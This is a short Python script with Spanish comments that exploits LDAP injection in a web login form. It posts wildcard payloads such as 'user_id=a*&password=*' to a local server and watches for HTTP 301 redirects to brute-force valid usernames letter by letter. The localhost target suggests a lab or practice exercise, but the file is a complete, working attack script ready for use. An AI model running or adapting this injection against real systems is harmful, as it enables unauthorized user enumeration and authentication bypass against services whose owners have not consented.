#!/usr/bin/python3

import requests
import sys
import signal
import string

# Para debug de red si se necesita
from pwn import log

# Ctrl+C handler
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Config
url = "http://localhost:8888"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
characters = string.ascii_lowercase


def get_users():
    posibles_usuarios = []

    log.info("Enumerando posibles usuarios...")

    # Enumeración inicial por primera letra
    for char in characters:
        payload = f"user_id={char}*&password=*&login=1&submit=Submit"
        response = requests.post(url, data=payload, headers=headers, allow_redirects=False)

        if response.status_code == 301:
            posibles_usuarios.append(char)

    # Fuerza bruta sobre los usuarios encontrados
    for user_prefix in posibles_usuarios:
        nombre_actual = user_prefix
        
        while True:
            encontrado = False
            for char in characters:
                nuevo_nombre = nombre_actual + char
                payload = f"user_id={nuevo_nombre}*&password=*&login=1&submit=Submit"
                response = requests.post(url, data=payload, headers=headers, allow_redirects=False)

                if response.status_code == 301:
                    nombre_actual += char
                    encontrado = True
                    break

            if not encontrado:
                break

        log.success(f"[+] Usuario encontrado: {nombre_actual}")


if __name__ == "__main__":
    get_users()
